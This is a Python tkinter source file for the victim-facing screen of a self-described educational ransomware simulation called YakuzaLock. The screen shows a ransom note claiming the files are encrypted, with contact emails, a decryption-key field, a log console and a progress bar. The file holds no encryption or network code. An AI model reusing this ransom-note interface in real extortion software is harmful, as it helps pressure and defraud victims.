"""Ransom Tools
Main GUI Layout of CryptoLock
Author: Yakuza-D
Disclaimer: this app written only and only for educational purpose
"""
# Step 1: Import Requires Modules
import sys
import os
import tkinter as tk
from tkinter import messagebox, simpledialog
from tkinter import ttk
from PIL import Image, ImageTk
from datetime import datetime, timedelta

from PIL.ImageOps import expand


# Step 2.1: Defining Function to load the current path of this python file and join it to relative_path
def resource_path(relative_path):
    # Get Directory name of the current python file
    basePath = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))

    # join relative_path to directory name of the current python file
    return os.path.join(basePath, relative_path)

# Define Global Constants
ICON_PATH = resource_path("img/app_icon.ico")
LOGO_PATH = resource_path("img/logo.png")
THANKS_PATH = resource_path("img/thank_you.png")


#Step 3: Create Main Class of Decryptor App
class DecryptorApp(tk.Tk):
    def __init__(self):
        super().__init__()
        self.log_listbox = None
        self.key_entry = None
        self.iconbitmap(ICON_PATH)
        self.title("YakuzaLock")
        self.configure(bg='black')
        self.geometry("900x800")
        self.initialize_ui()


    def initialize_ui(self):
        """ this Function Initialize UI Components """
        logoImage = Image.open(LOGO_PATH).resize((200, 200))
        logoPhoto = ImageTk.PhotoImage(logoImage)

        # Frame to hold Logo and Text
        frame = tk.Frame(self, bg='black')
        frame.pack(pady=(20, 20))

        # Logo Label with Adjust Padding
        # noinspection PyTypeChecker
        logoLabel = tk.Label(frame, image=logoPhoto, bg='black')
        logoLabel.image = logoPhoto
        logoLabel.pack(side=tk.LEFT, padx=(20, 10))

        # Add & Stylish Text, Label for Ransomware Notes
        ransomNotes = """ | PROOF OF CONCEPT: RANSOMWARE SIMULATION | \n\n
| Attention: Your Files Are Encrypted | \n\n
This simulation is solely for educational purposes and must not be used maliciously.
Users are fully accountable for their actions.
Your files have been encrypted using state-of-the-art encryption algorithms. To restore access to your data, you must enter the decryption key. \n\n
=> To Recover Your Files <= \n
Ping Us at [ yakuzaRansom@cryptolock.xyz ]"""

        # Creating text widget for the ransomeNotes
        ransomNoteLabel = tk.Text(frame, bg='black', font=('Helvetica CE', 12), wrap='word', height=16, width=60, borderwidth=0)
        ransomNoteLabel.pack(side=tk.LEFT, padx=(10, 20))

        # Creating the text with suitable tags
        ransomNoteLabel.insert(tk.END, " Proof of Concept: Yakuza Ransomware Simulation \n", "center_green")
        ransomNoteLabel.insert(tk.END, "| Attention: Your Files Are Encrypted | \n\n", "center_green")
        ransomNoteLabel.insert(tk.END, "This simulation is Only & Only for educational purposes and must not "
                                       "be used maliciously. \n", "center_white")
        ransomNoteLabel.insert(tk.END, "Users are fully accountable for their actions. \n\n", "center_white")
        ransomNoteLabel.insert(tk.END, "Your files have been encrypted using state-of-the-art "
                                       "encryption algorithms. To restore access to your data, "
                                       "you must enter the decryption key. \n\n", "center_red")
        ransomNoteLabel.insert(tk.END, " ** To Recover Your Files: ** \n", "center_yellow")
        ransomNoteLabel.insert(tk.END, "Ping Us at => [ ransom@yakuzalock.xyz ]", "center_yellow")

        # Configure the Tags
        ransomNoteLabel.tag_configure("center",justify='center')
        ransomNoteLabel.tag_configure("center_red",justify='center', foreground='red')
        ransomNoteLabel.tag_configure("center_green",justify='center', foreground='green')
        ransomNoteLabel.tag_configure("center_white",justify='center', foreground='white')
        ransomNoteLabel.tag_configure("center_yellow",justify='center', foreground='gold')

        # Apply tags for specif lines
        ransomNoteLabel.tag_add("center", "1.0","1.end")
        ransomNoteLabel.tag_add("center_green", "1.0","2.end")
        ransomNoteLabel.tag_add("center_white", "3.0","5.end")
        ransomNoteLabel.tag_add("center_red", "6.0","6.end")
        ransomNoteLabel.tag_add("center_yellow", "8.0","9.end")

        # Apply Configs and Setups
        ransomNoteLabel.configure(state='disabled')
        self.setup_key_frame()
        self.setup_log_frame()
        self.setup_progress_frame()

    def setup_key_frame(self):
        """ this function Setting UP the Frame for the Decryption Key Input """
        keyFrame = tk.Frame(self, bg='black')
        keyFrame.pack(fill=tk.X, padx=10, pady=(10, 5))

        self.key_entry = tk.Entry(keyFrame, fg='black', font=('Helvetica CE', 12), bd=1, relief=tk.FLAT)
        self.key_entry.pack(fill=tk.X, padx=10, pady=(10, 5))

        tk.Button(keyFrame, text='Start Decryption', bg="#d9534f", fg='white', font=('Helvetica CE', 12),
                  relief=tk.FLAT).pack(side=tk.RIGHT, padx=(10, 0))

    def setup_log_frame(self):
        """ this function Setting UP the Frame for the Log Console with a text banner in the bottom of the UI
        also implement a scrollbar for Log Console """
        # Dark background
        logFrame = tk.Frame(self, bg='black')
        logFrame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        # Banner at top of the Logs
        bannerText = "Welcome to YakuzaLocker - [HACKER MODE]"

        bannerLabel = tk.Label(logFrame, text=bannerText, bg='black', fg='orange', font=('Consolas', 12)) # Courier New
        bannerLabel.pack(side=tk.TOP, fill=tk.X)

        self.log_listbox = tk.Listbox(logFrame, height=6, width=50, bg='black', fg='#00FF00', font=('Consolas', 10))
        self.log_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        # Scrollbar for the Listbox
        scrollbar = tk.Scrollbar(logFrame, orient="vertical" ,command=self.log_listbox.yview)
        scrollbar.pack(side="right", fill="y")
        self.log_listbox.config(yscrollcommand=scrollbar.set)

    def setup_progress_frame(self):
        """ this function Setting UP the Frame for the Decryption Progress Bar in the bottom of the Log Console """
        self.progress_frame = tk.Frame(self, bg='black')
        self.progress_frame.pack(fill=tk.X, padx=10, pady=20)
        style = ttk.Style()
        style.theme_use('clam')
        style.configure("Enhanced.Horizontal.TProgressbar", troughcolor='black', background='green', thickness=20)

        self.progress = ttk.Progressbar(self.progress_frame, style="Enhanced.Horizontal.TProgressbar",
                                        mode="determinate", orient=tk.HORIZONTAL, length=400)

        self.progress.pack(fill=tk.X, expand=True)

        self.progress_label = tk.Label(self.progress_frame, text="Decryption Progress: 0%", bg='black', fg='pink')
        self.progress_label.pack()

# Step 9: Running the Program
if __name__ == "__main__":
    app = DecryptorApp()
    app.mainloop()

















